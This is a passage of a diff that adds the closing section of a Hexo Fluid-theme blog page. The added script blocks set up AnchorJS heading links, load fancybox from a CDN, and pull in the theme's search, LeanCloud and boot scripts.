+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
